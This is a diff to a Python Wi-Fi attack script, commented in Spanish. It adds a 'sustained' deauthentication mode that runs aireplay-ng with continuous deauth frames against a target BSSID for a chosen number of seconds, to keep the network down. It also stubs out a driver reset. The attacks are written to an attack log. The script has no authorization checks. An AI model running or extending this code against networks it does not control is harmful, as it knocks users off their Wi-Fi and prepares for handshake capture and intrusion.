@@ -26,14 +26,12 @@ def get_status(iface):
     return 'unknown'
 
 def reset_driver():
-    """Reset profundo del driver rtl8xxxu. El chip se cuelga en recepcion
-    tras muchos cambios de modo encadenados; recargar el modulo lo devuelve
-    a estado limpio garantizado. Necesario para que airodump/aireplay
-    reciban beacons de forma confiable."""
-    _run(['sudo', '/usr/sbin/modprobe', '-r', 'rtl8xxxu'], timeout=10)
-    time.sleep(2)
-    _run(['sudo', '/usr/sbin/modprobe', 'rtl8xxxu'], timeout=10)
-    time.sleep(3)
+    """Reset suave para el adaptador RTL8821CU (driver rtw88_8821cu). A
+    diferencia del viejo RTL8188EUS (rtl8xxxu), este driver es estable y
+    NO necesita recargar el modulo (evita ~5s de espera y no cuelga en RX).
+    Dejamos un reset minimo por si acaso; recargar rtw88 tiene dependencias
+    encadenadas (rtw88_core/usb) y es fragil, mejor no tocarlo."""
+    pass
 
 def enable_monitor(iface):
     reset_driver()
@@ -51,7 +49,12 @@ def disable_monitor(iface):
     time.sleep(0.5)
     return get_status(iface) == 'managed'
 
-def deauth(bssid, channel, count, iface):
+def deauth(bssid, channel, count, iface, duration=0):
+    """Deauth en dos modos:
+      - rafaga (duration=0): envia `count` rafagas y para. La red se cae
+        un momento y se reconecta sola. Rapido.
+      - sostenido (duration>0): envia deauth CONTINUO (--deauth 0) durante
+        `duration` segundos, manteniendo la red caida todo ese tiempo."""
     bssid = bssid.upper()  # aireplay-ng compara BSSID como string exacto, siempre en mayusculas
     ok = enable_monitor(iface)
     if not ok:
@@ -64,12 +67,19 @@ def deauth(bssid, channel, count, iface):
         return None, f"No se pudo fijar canal {channel}: {err_detail}"
 
     time.sleep(1)
-    r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL', '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
+    if duration and int(duration) > 0:
+        d = int(duration)
+        # Sostenido: --deauth 0 = continuo, cortado por timeout tras `d` segundos
+        r = _run(['sudo', '/usr/bin/timeout', str(d), '/usr/bin/stdbuf', '-oL', '-eL',
+                  '/usr/sbin/aireplay-ng', '--deauth', '0', '-a', bssid, iface], timeout=d + 5)
+    else:
+        # Rafaga: enviar `count` rafagas y parar
+        r = _run(['sudo', '/usr/bin/timeout', '20', '/usr/bin/stdbuf', '-oL', '-eL',
+                  '/usr/sbin/aireplay-ng', '--deauth', str(count), '-a', bssid, iface], timeout=25)
     output = ((r.stdout or '') + (r.stderr or '')) if r else ''
 
     disable_monitor(iface)
     return output, None
-
 
 def log_attack(attack_type, target_bssid, result, target_ssid=None, target_client_mac=None, details=None):
     """Guarda un ataque/prueba en wifi_attack_log. No debe bloquear el
@@ -301,7 +311,8 @@ def main():
         channel = int(sys.argv[3])
         count = int(sys.argv[4])
         iface_deauth = sys.argv[5] if len(sys.argv) > 5 else 'wlan1'
-        output, err = deauth(bssid, channel, count, iface_deauth)
+        duration = int(sys.argv[6]) if len(sys.argv) > 6 else 0
+        output, err = deauth(bssid, channel, count, iface_deauth, duration)
         if err:
             log_attack("deauth", bssid, "fail", details=err)
             print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_deauth)}))
